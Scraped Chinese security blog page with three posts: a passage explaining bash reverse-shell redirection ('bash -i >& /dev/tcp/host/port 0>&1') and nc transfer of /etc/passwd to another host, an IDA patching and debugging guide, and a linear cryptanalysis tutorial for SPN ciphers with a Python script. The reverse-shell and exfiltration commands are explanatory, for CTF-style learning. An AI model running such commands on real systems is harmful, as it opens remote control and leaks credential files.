<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">标准输入指向shell，标准输出和标准错误指向socket连接文件（此状态定义为状态B）</div><div class="line"> ---       +--------+</div><div class="line">( 0 ) ----&gt;| shell  |</div><div class="line"> ---       +--------+</div><div class="line"> ---       +--------+           +------------------+</div><div class="line">( 1 ) ----&gt;| shell  |  -----&gt;   |/dev/tcp/host/port|</div><div class="line"> ---       +--------+    ---&gt;   +------------------+</div><div class="line">      	       	        /</div><div class="line"> ---       +--------+  /</div><div class="line">( 2 ) ----&gt;| shell  | / </div><div class="line"> ---       +--------+</div></pre></td></tr></table></figure>
<p>因此执行命令“bash -i &gt;&amp; /dev/tcp/host/port”时将标准输出和标准错误进行了重定向,使标准输出和标准错误指向socket连接文件，标准输入指向原有shell不变。</p>
<p>使用命令“bash -i &gt;&amp; /dev/tcp/host/port”还不能反弹shell，因为此时的输入还是指向shell，此时会出现在被控端（执行反弹shell命令的终端）执行命令，在控制端（监听端口的终端）回显得现象。</p>
<p>命令“0&gt;&amp;1”是对文件描述符的拷贝，是将0[标准输入]重定向到了1[标准输出]指向的位置，此时1[标准输出]指向的是socket连接文件，重定向完成后，0[标准输入]也指向了socket连接文件，状态如下</p>
<blockquote>
<p>在状态B时，2[标准错误]指向的也是socket连接文件，因此命令”0&gt;&amp;2”与“0&gt;&amp;1”执行完后结果是一样的,所以反弹shell命令可以写成“bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;2”</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">标准输入、标准输出和标准错误全部指向socket连接文件（此状态定义为状态C）</div><div class="line"> ---       +--------+</div><div class="line">( 0 ) ----&gt;| shell  |\</div><div class="line"> ---       +--------+ \</div><div class="line">                       \</div><div class="line"> ---       +--------+    ---&gt;   +------------------+</div><div class="line">( 1 ) ----&gt;| shell  |  -----&gt;   |/dev/tcp/host/port|</div><div class="line"> ---       +--------+    ---&gt;   +------------------+</div><div class="line">      	       	        /</div><div class="line"> ---       +--------+  /</div><div class="line">( 2 ) ----&gt;| shell  | / </div><div class="line"> ---       +--------+</div></pre></td></tr></table></figure>
<p>命令”bash -i 5\&lt;>/dev/tcp/host/port 0&gt;&amp;5 1&gt;&amp;5”也可以反弹shell</p>
<p>说明：\&lt;>代表的是输入输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> ---       +--------+</div><div class="line">( 0 ) ----&gt;| shell  |\</div><div class="line"> ---       +--------+ \</div><div class="line">                       \</div><div class="line"> ---       +--------+    ---&gt;  ---    ------1-----&gt;   +------------------+</div><div class="line">( 1 ) ----&gt;| shell  |  -----&gt; ( 5 )                   |/dev/tcp/host/port|</div><div class="line"> ---       +--------+    ---&gt;  ---    &lt;-----0------   +------------------+</div><div class="line">      	       	        /</div><div class="line"> ---       +--------+  /</div><div class="line">( 2 ) ----&gt;| shell  | / </div><div class="line"> ---       +--------+</div></pre></td></tr></table></figure>
<p>其他参考文档</p>
<p><a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html" target="_blank" rel="external">https://www.gnu.org/software/bash/manual/html_node/Redirections.html</a></p>
<h3 id="0x04-下载文件"><a href="#0x04-下载文件" class="headerlink" title="0x04 下载文件"></a>0x04 下载文件</h3><p>一般linux上或多或少会支持一些命令wget、curl等，当这些命令存在时就可以完成文件的下载。</p>
<p>但是特殊情况下是这些命令都不存在。下面讲一讲其他办法：</p>
<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">接受: ip:192.168.228.221 1234 passwd.txt    </div><div class="line">发送: ip:192.168.228.222 1234 /etc/passwd</div><div class="line"></div><div class="line">方法一：</div><div class="line">接受方</div><div class="line">nc -l 1234 |tar -zxvf -</div><div class="line">发送方</div><div class="line">tar -zcvf - dir |nc 192.168.228.221 1234</div><div class="line"></div><div class="line">方法二：</div><div class="line">接受方</div><div class="line">nc -l 1234 &gt; passwd.txt</div><div class="line">发送方</div><div class="line">nc 192.168.228.221 1234 &lt; /etc/passwd</div></pre></td></tr></table></figure>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">import urllib</div></pre></td></tr></table></figure>
<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><p>一般的虚拟机上都会有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h4 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><p>上面重定向讲得十分透彻，所以这儿就可以快速写出对应的bash脚本了(最终屈服了，没写出来，仍然用的反弹的shell)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">将/usr/bin/curl 转化为16进制值，切片追加传输</div><div class="line"></div><div class="line">echo 0x31323334 |xxd -r </div><div class="line">1234</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;cat &lt;&lt; EOF &gt; hex2str\n#!/bin/sh\nI=0\nwhile [ \$I -lt \$&#123;#1&#125; ];\ndo\n    echo -en \&quot;\\x\&quot;\$&#123;1:\$I:2&#125;\n    let \&quot;I += 2\&quot;\ndone\n\nEOF\n&quot;</div></pre></td></tr></table></figure>
<p>也即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">cat &lt;&lt; EOF &gt; hex2str</div><div class="line">#!/bin/sh</div><div class="line">I=0</div><div class="line">while [ $I -lt $&#123;#1&#125; ];</div><div class="line">do</div><div class="line">    echo -en &quot;\x&quot;$&#123;1:$I:2&#125;</div><div class="line">    let &quot;I += 2&quot;</div><div class="line">done</div><div class="line">EOF</div></pre></td></tr></table></figure>
<blockquote>
<p>$hex2str 313233</p>
<p>123$</p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/08/IDA使用指南/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/04/08/IDA使用指南/" itemprop="url">IDA使用指南</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-08T17:17:36+08:00">
                2018-04-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>IDA之于逆向人员、PWN手的重要性几乎等同于左右手之于人。所以学好IDA是我们关键的一步。</p>
<h3 id="0x02-基本快捷键"><a href="#0x02-基本快捷键" class="headerlink" title="0x02 基本快捷键"></a>0x02 基本快捷键</h3><h4 id="2-1-View"><a href="#2-1-View" class="headerlink" title="2.1 View"></a>2.1 View</h4><h4 id="2-2-Jump"><a href="#2-2-Jump" class="headerlink" title="2.2 Jump"></a>2.2 Jump</h4><ul>
<li>Esc   jump to previous position</li>
<li>Ctrl+Enter  jump to next postion</li>
</ul>
<h3 id="0x03-patch"><a href="#0x03-patch" class="headerlink" title="0x03 patch"></a>0x03 patch</h3><p>以前逆向的时候，为了将有些部分的jz改为jnz，我们很可能会关闭IDA-gui，在UltraEdit中找到指定位置进行更改。这种操作十分麻烦，而且费时，所以产生了一下的方法！</p>
<ol>
<li><strong>在IDA安装目录中，找到cfg/idagui.cfg，更改“ApplyPatches”改为1</strong></li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">原来：</div><div class="line">&quot;ApplyPatches&quot;          =       0            // apply patches to input file</div><div class="line">现在</div><div class="line">&quot;ApplyPatches&quot;          =       1            // apply patches to input file</div></pre></td></tr></table></figure>
<ol start="2">
<li>如果想patch某个代码段，在<strong>IDA View窗口</strong>将光标指向对应的汇编代码，这时会发现在<strong>Hex View窗口</strong> 中对应汇编代码的16进制会突出显示。<strong>右键选择Edit（或者直接用F2）</strong>，即可对目标代码进行更改；<strong>最后右键选择Apply Changes（或者使用F2）</strong> 即可完成更改</li>
<li>patch之后，你可以直接看到patch更改后对应的汇编代码，也能继续调试</li>
</ol>
<h4 id="3-1-Change-byte"><a href="#3-1-Change-byte" class="headerlink" title="3.1 Change byte"></a>3.1 Change byte</h4><p>在Hex View窗口中右键更改</p>
<p>Edit-&gt;Patch Program -&gt;Change byte</p>
<h4 id="3-2-Change-word"><a href="#3-2-Change-word" class="headerlink" title="3.2 Change word"></a>3.2 Change word</h4><p>改字节  Edit-&gt;Patch Program -&gt;Change word</p>
<h4 id="3-3-Assemble"><a href="#3-3-Assemble" class="headerlink" title="3.3 Assemble"></a>3.3 Assemble</h4><p>Edit-&gt;Patch Program -&gt;Assemble</p>
<h4 id="3-4-Apply-patches-to-input-file"><a href="#3-4-Apply-patches-to-input-file" class="headerlink" title="3.4 Apply patches to input file"></a>3.4 Apply patches to input file</h4><p>Edit-&gt;Patch Program -&gt;Apply patches to input file</p>
<h3 id="0x04-Debug"><a href="#0x04-Debug" class="headerlink" title="0x04 Debug"></a>0x04 Debug</h3><h4 id="4-1-远程调试"><a href="#4-1-远程调试" class="headerlink" title="4.1 远程调试"></a>4.1 远程调试</h4><blockquote>
<ol>
<li>IDA 7.0给了很多远程调试器（dbgsrv文件夹下），只需要将与系统程序对应的server放到被调试的文件目录下即可。</li>
<li>运行该server</li>
<li>在IDA中启动对应的远程调试器，选择Debugger-&gt;Process Options，更改Application、Input File、Directory、Parameters、Hostname、Port、Password</li>
</ol>
</blockquote>
<h4 id="4-2-调试快捷键"><a href="#4-2-调试快捷键" class="headerlink" title="4.2 调试快捷键"></a>4.2 调试快捷键</h4><ul>
<li>F7 - step into</li>
<li>F8 - step over</li>
<li>F9 - start Process</li>
<li>F4 - Run to Cursor</li>
<li>Ctrl + F7  -  Run until Return</li>
<li>Ctrl + F2 - Terminate Process</li>
</ul>
<h4 id="4-3-Debug-View"><a href="#4-3-Debug-View" class="headerlink" title="4.3 Debug View"></a>4.3 Debug View</h4><p>如果你调试过程序，你会发现调试窗口其实是一个独立的多窗口环境，这里面有IDA View-RIP，General registers，Hex View，Stack View，Output window，Python输入框</p>
<h5 id="4-3-1-窗口布局"><a href="#4-3-1-窗口布局" class="headerlink" title="4.3.1 窗口布局"></a>4.3.1 窗口布局</h5><p>建议使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;           [IDA View-RIP]                  &#125; &#123; [General registers] [Hex View] [Stack View]&#125;</div><div class="line">&#123;           output window                                                                  &#125;</div><div class="line">&#123;Python [                                                                                 ]&#125;</div></pre></td></tr></table></figure>
<h5 id="4-3-2-IDA-View-RIP"><a href="#4-3-2-IDA-View-RIP" class="headerlink" title="4.3.2 IDA View-RIP"></a>4.3.2 IDA View-RIP</h5><p>该窗口支持多种显示，其中有静态分析的跳转图(Graph View)，也有汇编文本(Text View)</p>
<p>所有调整都可以通过右键触发</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/03/线性分析法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/04/03/线性分析法/" itemprop="url">线性分析法</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-03T19:26:53+08:00">
                2018-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/crypto/" itemprop="url" rel="index">
                    <span itemprop="name">crypto</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h3><p>线性分析法、差分分析法作为SPN(Substitution Permutation Network)的常用解法，一直让密码学家痴迷。最近也因为0ctf的一些密码学题目，对线性分析法有了一定的了解，并想写篇博客将具体内容详细展示！</p>
<h3 id="0x01-SPN网络介绍"><a href="#0x01-SPN网络介绍" class="headerlink" title="0x01 SPN网络介绍"></a>0x01 SPN网络介绍</h3><p>首先我们来看看这个spn网络</p>
<p><img src="\images\2018-04-03\1.png" alt="spn网络"></p>
<p>每轮都包含3个步骤：substitution（代替）、permutation（置换）、key-mixing（轮密钥加）</p>
<h4 id="1-1-substitution"><a href="#1-1-substitution" class="headerlink" title="1.1 substitution"></a>1.1 substitution</h4><p>输入4比特，输出4比特。这是一个双射，让集合$0-(2^4-1)$ 与其本身一一对应。</p>
<table>
<thead>
<tr>
<th>input</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
<th>E</th>
<th>F</th>
</tr>
</thead>
<tbody>
<tr>
<td>output</td>
<td>E</td>
<td>4</td>
<td>D</td>
<td>1</td>
<td>2</td>
<td>F</td>
<td>B</td>
<td>8</td>
<td>3</td>
<td>A</td>
<td>6</td>
<td>C</td>
<td>5</td>
<td>9</td>
<td>0</td>
<td>7</td>
</tr>
</tbody>
</table>
<p>它起到混淆的作用！</p>
<h4 id="1-2-permutation"><a href="#1-2-permutation" class="headerlink" title="1.2 permutation"></a>1.2 permutation</h4><p>输入16比特的数，对其各个比特进行置换。</p>
<table>
<thead>
<tr>
<th>input</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>10</th>
<th>11</th>
<th>12</th>
<th>13</th>
<th>14</th>
<th>15</th>
<th>16</th>
</tr>
</thead>
<tbody>
<tr>
<td>output</td>
<td>1</td>
<td>5</td>
<td>9</td>
<td>13</td>
<td>2</td>
<td>6</td>
<td>10</td>
<td>14</td>
<td>3</td>
<td>7</td>
<td>11</td>
<td>15</td>
<td>4</td>
<td>8</td>
<td>12</td>
<td>16</td>
</tr>
</tbody>
</table>
<p>其实可以看出，这是对上面4组S盒输出的16个比特进行简单的置换。</p>
<p>这是一个可逆的操作！</p>
<h4 id="1-3-轮密钥加"><a href="#1-3-轮密钥加" class="headerlink" title="1.3 轮密钥加"></a>1.3 轮密钥加</h4><p>提到轮密钥加，我们不得不提轮密钥的产生。一般的轮密钥产生都是利用一种具有雪崩效应的算法，根据初始密钥，生成每一轮的密钥！比较少见的是给出一段较长的密钥，直接切割出每轮的密钥。</p>
<p>最好不要出现以下几种密钥：</p>
<blockquote>
<ol>
<li>简单密钥。对于使用的0000....00或者0101..0101类型的密钥，最好不要使用</li>
<li>可通过某一轮的密钥反解出所有密钥。（前提是你知道某一轮的密钥。。。）</li>
<li>轮密钥不要相关。如果轮密钥只是简单的进行了固定的循环左移或右移变换，那么所有的密钥将会有相同数量的1，以及相同距离的1。这都是很危险的。<a href="https://en.wikipedia.org/wiki/Related-key_attack" target="_blank" rel="external">Related-key attack</a></li>
</ol>
</blockquote>
<h4 id="1-4-解密"><a href="#1-4-解密" class="headerlink" title="1.4 解密"></a>1.4 解密</h4><p>其实，由于上面的所有变换都是可逆的运算，所以最终都能根据轮密码求解出原文。</p>
<h3 id="0x02-线性分析法简述"><a href="#0x02-线性分析法简述" class="headerlink" title="0x02 线性分析法简述"></a>0x02 线性分析法简述</h3><p>线性分析法的基本想法是生成一系列大概可用的线性表达式，如：</p>
<p>$X_{i_1}\oplus X_{i_2} ... X_{i_u} \oplus Y_{j_1} \oplus Y_{j_2} ... Y_{j_v}=0$</p>
<p>其中 $X_i$ 表示第i个比特的输入，$Y_j$ 表示第j个比特的输出</p>
<p>其实当我们比较随机的选取这u+v个比特，最终上述表达式成功的概率大概是1/2。</p>
<p><strong>线性分析法基本原理：如果线性表达式成立的概率距离1/2越远，那么越容易使用线性分析法。若线性表达式发生概率为$p_L$， 那么$|p_L-1/2|$越大越好。</strong></p>
<p>能够使用线性分析法的环境：线性分析可行一般取决于S盒设计，如果S盒导致出现多个线性表达式成立的概率距离1/2很远，那么最终分析结果将会越好；其次就是密钥长度不要太长，轮次不能太多，否则分析难度将会急剧增加。</p>
<h4 id="2-1-Piling-Up-Principle（叠加原理）"><a href="#2-1-Piling-Up-Principle（叠加原理）" class="headerlink" title="2.1 Piling-Up Principle（叠加原理）"></a>2.1 Piling-Up Principle（叠加原理）</h4><p>$$<br>\begin{equation}<br>P_r(X_1=i)=\left [<br>             \begin{array}{lr}<br>              p_1, i=0 \newline<br>             1-p_1, i=1 \newline<br>             \end{array}<br>\right]\<br>\end{equation}<br>$$</p>
<p>而<br>$$<br>P_r(X_2=i)=\left [<br>             \begin{array} {lr}<br>              p_2, i=0 \newline<br>             1-p_2, i=1 \newline<br>             \end{array}<br>\right]<br>$$</p>
<p>于是有：<br>$$<br>P_r(X_1 \oplus X_2) = P_r(X_1=X_2)=p_1 p_2 + (1-p_1)(1-p_2)<br>$$<br>令 $p_1=1/2+\epsilon_1$， $p_2=1/2+\epsilon_2$</p>
<p>则有 $P_r(X_1 \oplus X_2 = 0)=1/2+2\epsilon_1 \epsilon_2$</p>
<p>我们可以简写 $\epsilon_{1,2} = 2\epsilon_1 \epsilon_2$</p>
<p>根据Piling-Up Lemma (Matsui) ，我们可以快速得到：</p>
<p>$P_r(X_1 \oplus ... \oplus X_n = 0) = 1/2 + 2^{n-1} \prod_{i=1} ^n \epsilon_i$</p>
<p>如果其中某一个$p_i=1/2$， 那么最终的 $P_r(X_1 \oplus ... \oplus X_n = 0) = 1/2$</p>
<p>假设 $X_1 \oplus X_2$ 与 $X_2 \oplus X_3$ 是相互独立的，那么我么有：</p>
<p>$P_r(X_1 \oplus X_3 = 0) = 1/2 +2\epsilon_{1,2} \epsilon_{2,3}$</p>
<p>所以在这种情况下有 $\epsilon_{1,3} = 2\epsilon_{1,2} \epsilon_{2,3}$</p>
<h4 id="2-2-分析S盒"><a href="#2-2-分析S盒" class="headerlink" title="2.2 分析S盒"></a>2.2 分析S盒</h4><p>假设S盒输入四位，输出四位，如下图所示：</p>
<p><img src="\images\2018-04-03\2.png" alt="S盒"></p>
<p>假设现在使用的查看的是$X_2 \oplus X_3 \oplus =Y_1 \oplus Y_3 \oplus Y_4$</p>
<p>我们首先输入16个可能的输入作为X，然后检查对应的可能输出作为Y。我们发现这16个中有12个符合上面的等式。所以上式发生的概率偏差为 $12/16-1/2=1/4$</p>
<p>假设现在使用的查看的是$X_1 \oplus X_4 \oplus =Y_2$</p>
<p>我们首先输入16个可能的输入作为X，然后检查对应的可能输出作为Y。我们发现这16个中有8个符合上面的等式。所以上式发生的概率偏差为 $8/16-1/2=0$</p>
<p><img src="\images\2018-04-03\3.png" alt="近似值"></p>
<p>上述讲述了通常意义上的方法，那么我们如何运用算法来求解呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">import sys</div><div class="line"></div><div class="line"># sbox from the tutorial</div><div class="line">sbox = [0xe, 4, 0xd, 1, 2, 0xf, 0xb, 8, 3, 0xa, 6, 0xc, 5, 9, 0, 7]</div><div class="line">#sbox = [0xf, 3, 0xa, 6, 4, 1, 0xb, 9, 0xe, 5, 0, 0xd, 2, 0xc, 7, 8]</div><div class="line">SIZE_SBOX = len(sbox)</div><div class="line">linear_approx_table = [0]*SIZE_SBOX*SIZE_SBOX</div><div class="line"></div><div class="line"># compute the linear approximation for a given &quot;input = output&quot; equation</div><div class="line">def linearApprox(input_int, output_int):</div><div class="line">    total = 0</div><div class="line">    # range over the input</div><div class="line">    for ii in range(SIZE_SBOX):</div><div class="line">        # get input and output of our equations</div><div class="line">        input_masked = ii &amp; input_int</div><div class="line">        output_masked = sbox[ii] &amp; output_int</div><div class="line">        # same result?</div><div class="line">        if (bin(input_masked).count(&quot;1&quot;) - bin(output_masked).count(&quot;1&quot;)) % 2 == 0:</div><div class="line">            total += 1</div><div class="line">    # get the number of results compared to 8/16</div><div class="line">    result = total - (SIZE_SBOX//2)</div><div class="line">    if result &gt; 0:</div><div class="line">        result = &quot;+&quot; + str(result)</div><div class="line">    else:</div><div class="line">        result = str(result)</div><div class="line"></div><div class="line">    return result</div><div class="line"></div><div class="line">def main():</div><div class="line">    # rows</div><div class="line"></div><div class="line">    sys.stdout.write( &quot;     | &quot;)</div><div class="line">    for i in range(SIZE_SBOX):</div><div class="line">        sys.stdout.write(str(i).rjust(4) + &quot; &quot;)</div><div class="line">    print &quot;&quot;</div><div class="line">    print &quot; &quot; + &quot;-&quot; * (SIZE_SBOX * 5 + 5)</div><div class="line">    for row in range(SIZE_SBOX):</div><div class="line">        sys.stdout.write(str(row).rjust(4) +  &quot; | &quot;)</div><div class="line">        # cols</div><div class="line">        for col in range(SIZE_SBOX):</div><div class="line">            # print the linear approx</div><div class="line">            r = linearApprox(row,col)</div><div class="line">            sys.stdout.write(r.rjust(4) + &quot; &quot;)</div><div class="line">            linear_approx_table[row*SIZE_SBOX+col]=(int(r))</div><div class="line">        print &quot;&quot;</div><div class="line">    print linear_approx_table</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>根据上述算法，我们得到下面这张表linear Approximation Table：</p>
<p><img src="\images\2018-04-03\4.png" alt=""></p>
<p>我们来讲一讲这张表的含义：</p>
<p><strong>Input sum代表的是所有比特位的累加和，output sum表示所有比特位的累加和。而在表中的数字代表的是：输入和的2进制表达式对应的输入与输出和的2进制表达式对应的输出组成的线性表达式，其成立的次数减去所有可能数的一半。</strong></p>
<p>例如：$X_2 \oplus X_3 \oplus =Y_1 \oplus Y_3 \oplus Y_4$ 对应的就是$(2^2+2^1,2^3+2+2^0)=(6,11)=+4$，概率偏差就是1/4</p>
<p>$X_1 \oplus X_4 \oplus =Y_2$ 对应的就是$(2^3+1,2^2)=(9,4)=0$  其概率偏差为0</p>
<p>几个常用的引理：</p>
<blockquote>
<ol>
<li>任何输出位的线性组合，在遍历ii，求得sbox[ii] &amp; output_sum后，必定具有相同数量的0和1</li>
<li>所有无输出比特的线性组合与所有无输入的线性组合相等，都是1/2，即左上角（0,0）是sbox_size/2，而(0,i)=(i,0)=0， 其中i不为0。</li>
<li>所有行和的绝对值为sbox_size/2，所有列和的绝对值为sbox_size/2。</li>
</ol>
</blockquote>
<h4 id="2-3-引理的证明"><a href="#2-3-引理的证明" class="headerlink" title="2.3 引理的证明"></a>2.3 引理的证明</h4><p>根据算法，我们可以写出下列表达式</p>
<p>我们首先看一下input_sum确定的情况：<br>$$<br>\sum_{j=0} ^n \sum_{i=0} ^n P(output_{mask},input_{mask})=\sum_{j=0} ^n \sum_{i=0} ^n P(i \&amp; input_{sum}, sbox[i] \&amp; j)<br>= \sum_{i=0} ^n \sum_{j=0} ^n P(i \&amp; input_{sum}, sbox[i] \&amp; j) =  \sum_{sbox[i]=0}  P(i \&amp; input_{sum}, sbox[i] \&amp; j)  =  -sbox_{size}/2 或者 +sbox_{size}/2<br>$$</p>
<h3 id="0x03-线性分析法整体分析"><a href="#0x03-线性分析法整体分析" class="headerlink" title="0x03 线性分析法整体分析"></a>0x03 线性分析法整体分析</h3><h4 id="3-1-具体步骤"><a href="#3-1-具体步骤" class="headerlink" title="3.1 具体步骤"></a>3.1 具体步骤</h4><p>根据上面那种线性分析表格，我们有：</p>
<p>$S_{12}: X_1 \oplus X_3 \oplus X_4 = Y_2;  概率12/16, 偏差1/4$</p>
<p>$S_{22}: X_2= Y_2 \oplus Y_4;  概率4/16, 偏差-1/4$</p>
<p>$S_{32}: X_2= Y_2 \oplus Y_4;  概率4/16, 偏差-1/4$</p>
<p>$S_{34}: X_2= Y_2 \oplus Y_4;  概率416, 偏差-1/4$</p>
<p>设 $U_{i,j}(V_{i,j})$ 表示第i轮的16比特中的第j比特输入或输出，$P_i$ 代表16位明文的第i位输入</p>
<p><img src="\images\2018-04-03\5.png" alt=""></p>
<p>于是我们有：</p>
<p>第一轮： $V_{1,6} = U_{1,5} \oplus U_{1,7} \oplus U_{1,8} = (P_5 \oplus K_{1,5}) \oplus (P_7 \oplus K_{1,7}) \oplus (P_8 \oplus K_{1,8})$    (2)</p>
<p>第二轮：$V_{2,6} \oplus V_{2,8} = U_{2,6} = V_{1,6} \oplus K_{2,6}$</p>
